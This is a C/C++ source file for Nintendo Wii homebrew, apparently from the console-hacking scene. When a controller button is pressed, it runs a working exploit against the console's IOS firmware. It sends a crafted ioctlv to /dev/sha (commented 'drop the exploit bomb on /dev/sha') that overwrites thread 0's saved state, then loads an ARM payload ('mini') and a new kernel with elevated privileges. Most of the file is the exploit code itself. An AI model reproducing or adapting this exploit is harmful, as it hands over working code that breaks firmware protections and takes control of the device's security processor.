#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <string.h>
#include <string>
#include <malloc.h>
#include <time.h>
#include <gccore.h>
#include <wiiuse/wpad.h>
#include <ogc/ipc.h>
#include <ogc/machine/processor.h>
#include <ogc/machine/asm.h>

#include "gecko.h"

#include "armboot_bin.h"
#include "loadkernel_bin.h"

#define IOS_TO_LOAD 0x00000001000000FEULL
#define SRAMADDR(x) (0x0d400000 | ((x) & 0x000FFFFF))
#define MEM_TO_RAW(x) (u32*)( ( ((u32)x) & 0x0FFFFFFF) | 0x10000000)

static void *xfb = NULL;
static GXRModeObj *vmode = NULL;

static inline u32 _read32(u32 addr)
{
	u32 x;
	__asm__ __volatile__ ("lwz %0,0(%1) ; sync" : "=r"(x) : "b"(addr));
	return x;
}

//---------------------------------------------------------------------------------
int main(int argc, char **argv) 
//---------------------------------------------------------------------------------
{
	// Initialise the video system
	VIDEO_Init();

	vmode = VIDEO_GetPreferredMode(NULL);
	xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(vmode));

	VIDEO_Configure(vmode);
	VIDEO_SetNextFramebuffer(xfb);
	VIDEO_SetBlack(false);
	VIDEO_Flush();

	VIDEO_WaitVSync();
	if (vmode->viTVMode & VI_NON_INTERLACE) VIDEO_WaitVSync();

	// Initialize the console
	CON_Init(xfb,(vmode->viWidth + vmode->viXOrigin - 640) / 2, (vmode->viHeight + vmode->viYOrigin - 480) / 2,  640, 480, 640*VI_DISPLAY_PIX_SZ );
	CheckForGecko();
	VIDEO_ClearFrameBuffer(vmode, xfb, COLOR_BLACK);
    
	// This function initialises the attached controllers
	//WPAD_Init();
	PAD_Init();

	printf("Hello World!\n");
	if(	read32(0x0d800064) != 0xFFFFFFFF )
	{
		printf("AHB Access Disabled\n");
		exit(0);
	}
	
	printf("AHB Access Enabled\n");
	write16(0x0d8b420a, 0);
	s8 mini_loaded = 0;
	while(1) {

		// Call WPAD_ScanPads each loop, this reads the latest controller states
		WPAD_ScanPads();
		PAD_ScanPads();

		// WPAD_ButtonsDown tells us which buttons were pressed in this loop
		// this is a "one shot" state which will not fire again until the button has been released
		u32 pressed = 0; //WPAD_ButtonsDown(0);
		u32 gcPressed ATTRIBUTE_ALIGN(32) = PAD_ButtonsDown(0);
		u32 output ATTRIBUTE_ALIGN(32) = 0xB16B00B5;

		// We return to the launcher application via exit
		if ( pressed & WPAD_BUTTON_HOME || gcPressed & PAD_BUTTON_START) 
		{
			if(!mini_loaded)
				exit(0);
			
			ioctlv data[2] = {0};
			u64 titleID = 0x000100014C554C5ALL;
			data[0].data = &titleID;
			data[0].len = sizeof(u64);
			printf("opening ES : %d\n", __ES_Init());
			printf("ret of Launch : %d\n", IOS_IoctlvReboot((mini_loaded) ? 0x08 : 0x50, 0x08, 2, 0, data));
			while(1);
		}
		
		if ( pressed & WPAD_BUTTON_B || gcPressed & PAD_BUTTON_B)
		{
			printf("im alive!\n");
		}
		
		if ( pressed & WPAD_BUTTON_2 || gcPressed & PAD_BUTTON_X ) 
		{
			return 0;
		}
		
		if ( pressed & WPAD_BUTTON_1 || gcPressed & PAD_BUTTON_Y ) 
		{
			printf("poking MEM2\n");
			*(vu32*)0x90001234 = 0x9001CAFE;
			DCFlushRange((void*)0x90001234, 4);
			/*write32(0x91234567, 0x9001CAFE);
			DCFlushRange((void*)0x90001234, 4);   */
			printf("opening ES : %d\n", __ES_Init());
			printf("sending IOS_Ioctl : 0x%08X - 0x%08X\n",(u32)&pressed, (u32)&output);
			printf("ret of IOS_Ioctl : %d\n", IOS_Ioctl((mini_loaded) ? 0x08 : 0x50, 0x0F, &pressed, 4, &output, 4));
			printf("output : 0x%08X\n", output);
		}
		
		if ( pressed & WPAD_BUTTON_A || gcPressed & PAD_BUTTON_A ) 
		{
			if(mini_loaded)
				continue;
			
			//load mini
			gprintf("loading mini...\n");
			
			s32 fd = -1;
			ioctlv* params = NULL;
			try
			{
				void *mini = (void*)0x90100000;
				memcpy(mini, armboot_bin, armboot_bin_size);
				DCFlushRange( mini, armboot_bin_size );

				//time to drop the exploit bomb on /dev/sha
				fd = IOS_Open("/dev/sha", 0);
				if(fd < 0)
					throw "Failed to open /dev/sha : " + std::to_string(fd);
				
				params = (ioctlv*)memalign(sizeof(ioctlv) * 4, 32);
				if(params == NULL)
					throw "failed to alloc IOS call data";

				//overwrite the thread 0 state with address 0 (0x80000000)
				memset(params, 0, sizeof(ioctlv) * 4);
				params[1].data	= (void*)0xFFFE0028;
				params[1].len	= 0;
				DCFlushRange(params, sizeof(ioctlv) * 4);

				//set code to load new ios via syscall 43
				memcpy((void*)0x80000000, loadkernel_bin, loadkernel_bin_size);
				DCFlushRange((void*)0x80000000, loadkernel_bin_size);
				ICInvalidateRange((void*)0x80000000, loadkernel_bin_size);

				//send sha init command
				mini_loaded = 1;
				s32 ret = IOS_Ioctlv(fd, 0x00, 1, 2, params);
				if(ret < 0)
					throw "failed to send SHA init : " + std::to_string(ret);

				//wait for IPC to come back online. for mini this doesn't matter, but for IOS kernels it most certainly does.
				for (u32 counter = 0; !(read32(0x0d000004) & 2); counter++) 
				{
					usleep(1000);
					
					if (counter >= 400)
						break;
				}

				__IPC_Reinitialize();
				gprintf("IPC reinit\n");
			}
			catch (const std::string& ex)
			{
				gprintf("IOSBoot Exception -> %s", ex.c_str());
			}
			catch (char const* ex)
			{
				gprintf("IOSBoot Exception -> %s", ex);
			}
			catch (...)
			{
				gprintf("IOSBoot Exception was thrown");
			}

			if(params)
				free(params);

			if(fd >= 0)
				IOS_Close(fd);
			
			break;
		}

		// Wait for the next frame
		VIDEO_WaitVSync();
	}

	return 0;
}
